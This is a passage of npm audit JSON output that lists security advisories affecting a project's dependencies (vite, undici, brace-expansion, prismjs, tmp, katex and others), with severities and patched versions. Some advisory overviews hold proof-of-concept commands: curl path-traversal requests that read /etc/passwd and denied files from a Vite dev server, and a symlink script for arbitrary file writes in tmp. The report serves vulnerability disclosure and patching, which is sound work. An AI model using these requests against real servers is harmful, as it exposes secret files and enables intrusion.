'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n```\n\n```bash\ncurl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'\n```",
      "reported_by": null,
      "title": "Vite allows server.fs.deny to be bypassed with .svg or relative paths",
      "metadata": null,
      "cves": [
        "CVE-2025-31486"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.0.0 <5.4.17",
      "github_advisory_id": "GHSA-xcj6-pq6g-qj4x",
      "recommendation": "Upgrade to version 5.4.17 or later",
      "patched_versions": ">=5.4.17",
      "updated": "2025-04-30T17:26:54.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-xcj6-pq6g-qj4x"
    },
    "1104501": {
      "findings": [
        {
          "version": "5.28.3",
          "paths": [
            "packages__components>@elastic/elasticsearch>@elastic/transport>undici"
          ]
        },
        {
          "version": "5.28.4",
          "paths": [
            "packages__components>@qdrant/js-client-rest>undici"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-cxrh-j4jr-qwg3\n- https://github.com/nodejs/undici/issues/3895\n- https://github.com/nodejs/undici/pull/4088\n- https://nvd.nist.gov/vuln/detail/CVE-2025-47279\n- https://github.com/advisories/GHSA-cxrh-j4jr-qwg3",
      "created": "2025-05-15T14:15:06.000Z",
      "id": 1104501,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nApplications that use undici to implement a webhook-like system are vulnerable. If the attacker set up a server with an invalid certificate, and they can force the application to call the webhook repeatedly, then they can cause a memory leak. \n\n### Patches\n\nThis has been patched in https://github.com/nodejs/undici/pull/4088.\n\n### Workarounds\n\nIf a webhook fails, avoid keep calling it repeatedly.\n\n### References\n\nReported as: https://github.com/nodejs/undici/issues/3895",
      "reported_by": null,
      "title": "undici Denial of Service attack via bad certificate data",
      "metadata": null,
      "cves": [
        "CVE-2025-47279"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "undici",
      "vulnerable_versions": "<5.29.0",
      "github_advisory_id": "GHSA-cxrh-j4jr-qwg3",
      "recommendation": "Upgrade to version 5.29.0 or later",
      "patched_versions": ">=5.29.0",
      "updated": "2025-05-16T02:07:01.000Z",
      "cvss": {
        "score": 3.1,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
      },
      "cwe": [
        "CWE-401"
      ],
      "url": "https://github.com/advisories/GHSA-cxrh-j4jr-qwg3"
    },
    "1105443": {
      "findings": [
        {
          "version": "1.1.11",
          "paths": [
            ".>eslint>minimatch>brace-expansion"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-5889\n- https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\n- https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\n- https://vuldb.com/?ctiid.311660\n- https://vuldb.com/?id.311660\n- https://vuldb.com/?submit.585717\n- https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\n- https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\n- https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\n- https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\n- https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
      "created": "2025-06-09T21:30:51.000Z",
      "id": 1105443,
      "npm_advisory_id": null,
      "overview": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
      "reported_by": null,
      "title": "brace-expansion Regular Expression Denial of Service vulnerability",
      "metadata": null,
      "cves": [
        "CVE-2025-5889"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "brace-expansion",
      "vulnerable_versions": ">=1.0.0 <=1.1.11",
      "github_advisory_id": "GHSA-v6h2-p8h4-qcjw",
      "recommendation": "Upgrade to version 1.1.12 or later",
      "patched_versions": ">=1.1.12",
      "updated": "2025-06-11T21:00:29.000Z",
      "cvss": {
        "score": 3.1,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
      },
      "cwe": [
        "CWE-400"
      ],
      "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
    },
    "1105444": {
      "findings": [
        {
          "version": "2.0.1",
          "paths": [
            ".>@typescript-eslint/typescript-estree>minimatch>brace-expansion"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-5889\n- https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\n- https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\n- https://vuldb.com/?ctiid.311660\n- https://vuldb.com/?id.311660\n- https://vuldb.com/?submit.585717\n- https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\n- https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\n- https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\n- https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\n- https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
      "created": "2025-06-09T21:30:51.000Z",
      "id": 1105444,
      "npm_advisory_id": null,
      "overview": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
      "reported_by": null,
      "title": "brace-expansion Regular Expression Denial of Service vulnerability",
      "metadata": null,
      "cves": [
        "CVE-2025-5889"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "brace-expansion",
      "vulnerable_versions": ">=2.0.0 <=2.0.1",
      "github_advisory_id": "GHSA-v6h2-p8h4-qcjw",
      "recommendation": "Upgrade to version 2.0.2 or later",
      "patched_versions": ">=2.0.2",
      "updated": "2025-06-11T21:00:29.000Z",
      "cvss": {
        "score": 3.1,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
      },
      "cwe": [
        "CWE-400"
      ],
      "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
    },
    "1105770": {
      "findings": [
        {
          "version": "1.29.0",
          "paths": [
            "packages__ui>react-syntax-highlighter>prismjs"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-53382\n- https://gist.github.com/jackfromeast/aeb128e44f05f95828a1a824708df660\n- https://github.com/PrismJS/prism/blob/59e5a3471377057de1f401ba38337aca27b80e03/prism.js#L226-L259\n- https://github.com/PrismJS/prism/pull/3863\n- https://github.com/PrismJS/prism/commit/8e8b9352dac64457194dd9e51096b4772532e53d\n- https://github.com/advisories/GHSA-x7hr-w5r2-h6wg",
      "created": "2025-03-03T09:30:34.000Z",
      "id": 1105770,
      "npm_advisory_id": null,
      "overview": "Prism (aka PrismJS) through 1.29.0 allows DOM Clobbering (with resultant XSS for untrusted input that contains HTML but does not directly contain JavaScript), because document.currentScript lookup can be shadowed by attacker-injected HTML elements.",
      "reported_by": null,
      "title": "PrismJS DOM Clobbering vulnerability",
      "metadata": null,
      "cves": [
        "CVE-2024-53382"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "prismjs",
      "vulnerable_versions": "<1.30.0",
      "github_advisory_id": "GHSA-x7hr-w5r2-h6wg",
      "recommendation": "Upgrade to version 1.30.0 or later",
      "patched_versions": ">=1.30.0",
      "updated": "2025-06-30T12:51:20.000Z",
      "cvss": {
        "score": 4.9,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-79",
        "CWE-94"
      ],
      "url": "https://github.com/advisories/GHSA-x7hr-w5r2-h6wg"
    },
    "1106812": {
      "findings": [
        {
          "version": "1.0.2",
          "paths": [
            "packages__server>express-session>on-headers"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/jshttp/on-headers/security/advisories/GHSA-76c9-3jph-rj3q\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7339\n- https://github.com/expressjs/morgan/issues/315\n- https://github.com/jshttp/on-headers/issues/15\n- https://github.com/jshttp/on-headers/commit/c6e384908c9c6127d18831d16ab0bd96e1231867\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-76c9-3jph-rj3q",
      "created": "2025-07-17T21:17:19.000Z",
      "id": 1106812,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nA bug in on-headers versions `< 1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`\n\n### Patches\n\nUsers should upgrade to `1.1.0`\n\n### Workarounds\n\nUses are encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array.",
      "reported_by": null,
      "title": "on-headers is vulnerable to http response header manipulation",
      "metadata": null,
      "cves": [
        "CVE-2025-7339"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "on-headers",
      "vulnerable_versions": "<1.1.0",
      "github_advisory_id": "GHSA-76c9-3jph-rj3q",
      "recommendation": "Upgrade to version 1.1.0 or later",
      "patched_versions": ">=1.1.0",
      "updated": "2025-07-30T21:06:13.000Z",
      "cvss": {
        "score": 3.4,
        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-241"
      ],
      "url": "https://github.com/advisories/GHSA-76c9-3jph-rj3q"
    },
    "1106849": {
      "findings": [
        {
          "version": "0.2.3",
          "paths": [
            "packages__server>cypress>tmp"
          ]
        },
        {
          "version": "0.0.33",
          "paths": [
            "packages__server>oclif>@oclif/plugin-not-found>@inquirer/prompts>@inquirer/editor>external-editor>tmp"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6\n- https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b\n- https://nvd.nist.gov/vuln/detail/CVE-2025-54798\n- https://github.com/raszi/node-tmp/issues/207\n- https://github.com/advisories/GHSA-52f5-9888-hmc6",
      "created": "2025-08-06T17:06:04.000Z",
      "id": 1106849,
      "npm_advisory_id": null,
      "overview": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
      "reported_by": null,
      "title": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
      "metadata": null,
      "cves": [
        "CVE-2025-54798"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "tmp",
      "vulnerable_versions": "<=0.2.3",
      "github_advisory_id": "GHSA-52f5-9888-hmc6",
      "recommendation": "Upgrade to version 0.2.4 or later",
      "patched_versions": ">=0.2.4",
      "updated": "2025-08-07T15:11:23.000Z",
      "cvss": {
        "score": 2.5,
        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-59"
      ],
      "url": "https://github.com/advisories/GHSA-52f5-9888-hmc6"
    },
    "1107323": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        },
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58751\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb\n- https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d\n- https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069\n- https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec\n- https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0\n- https://github.com/advisories/GHSA-g4jq-h2w9-997c",
      "created": "2025-09-09T20:55:56.000Z",
      "id": 1107323,
      "npm_advisory_id": null,
      "overview": "### Summary\nFiles starting with the same name with the public directory were served bypassing the `server.fs` settings.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\n\n### Details\nThe [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with┬á \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,┬á because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb",
      "reported_by": null,
      "title": "Vite middleware may serve files starting with the same name with the public directory",
      "metadata": null,
      "cves": [
        "CVE-2025-58751"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "vite",
      "vulnerable_versions": "<=5.4.19",
      "github_advisory_id": "GHSA-g4jq-h2w9-997c",
      "recommendation": "Upgrade to version 5.4.20 or later",
      "patched_versions": ">=5.4.20",
      "updated": "2025-09-09T20:55:57.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22",
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-g4jq-h2w9-997c"
    },
    "1107327": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        },
        {
          "version": "4.5.2",
          "paths": [
            "packages__ui>flowise-embed-react>@ladle/react>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58752\n- https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f\n- https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e\n- https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea\n- https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6\n- https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md\n- https://github.com/advisories/GHSA-jqfw-vq24-v9c3",
      "created": "2025-09-09T20:54:42.000Z",
      "id": 1107327,
      "npm_advisory_id": null,
      "overview": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" > /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,┬á because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.",
      "reported_by": null,
      "title": "Vite's `server.fs` settings were not applied to HTML files",
      "metadata": null,
      "cves": [
        "CVE-2025-58752"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "vite",
      "vulnerable_versions": "<=5.4.19",
      "github_advisory_id": "GHSA-jqfw-vq24-v9c3",
      "recommendation": "Upgrade to version 5.4.20 or later",
      "patched_versions": ">=5.4.20",
      "updated": "2025-09-09T20:54:43.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-23",
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-jqfw-vq24-v9c3"
    },
    "1107419": {
      "findings": [
        {
          "version": "0.16.9",
          "paths": [
            "packages__ui>remark-math>micromark-extension-math>katex"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546\n- https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c\n- https://nvd.nist.gov/vuln/detail/CVE-2025-23207\n- https://github.com/advisories/GHSA-cg87-wmx4-v546",
      "created": "2025-01-17T21:22:56.000Z",
      "id": 1107419,
      "npm_advisory_id": null,
      "overview": "### Impact\nKaTeX users who render untrusted mathematical expressions with `renderToString` could encounter malicious input using `\\htmlData` that runs arbitrary JavaScript, or generate invalid HTML.\n\n### Patches\nUpgrade to KaTeX v0.16.21 to remove this vulnerability.\n\n### Workarounds\n- Avoid use of or turn off the `trust` option, or set it to forbid `\\htmlData` commands.\n- Forbid inputs containing the substring `\"\\\\htmlData\"`.\n- Sanitize HTML output from KaTeX.\n\n### Details\n`\\htmlData` did not validate its attribute name argument, allowing it to generate invalid or malicious HTML that runs scripts.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n- Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)",
      "reported_by": null,
      "title": "KaTeX \\htmlData does not validate attribute names",
      "metadata": null,
      "cves": [
        "CVE-2025-23207"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "katex",
      "vulnerable_versions": ">=0.12.0 <=0.16.20",
      "github_advisory_id": "GHSA-cg87-wmx4-v546",
      "recommendation": "Upgrade to version 0.16.21 or later",
      "patched_versions": ">=0.16.21",
      "updated": "2025-09-10T21:03:08.000Z",
      "cvss": {
        "score": 6.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-79",
        "CWE-116"
      ],
      "url": "https://github.com/advisories/GHSA-cg87-wmx4-v546"
    },
    "1107537": {
      "findings": [
        {
          "version": "2.4.11",
          "paths": [
            "packages__components>typeorm>sha.js"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5\n- https://nvd.nist.gov/vuln/detail/CVE-2025-9288\n- https://github.com/browserify/sha.js/pull/78\n- https://github.com/browserify/sha.js/commit/f2a258e9f2d0fcd113bfbaa49706e1ac0d979ba5\n- https://www.cve.org/CVERecord?id=CVE-2025-9287\n- https://github.com/advisories/GHSA-95m3-7q98-8xr5",
      "created": "2025-08-21T14:47:55.000Z",
      "id": 1107537,
      "npm_advisory_id": null,
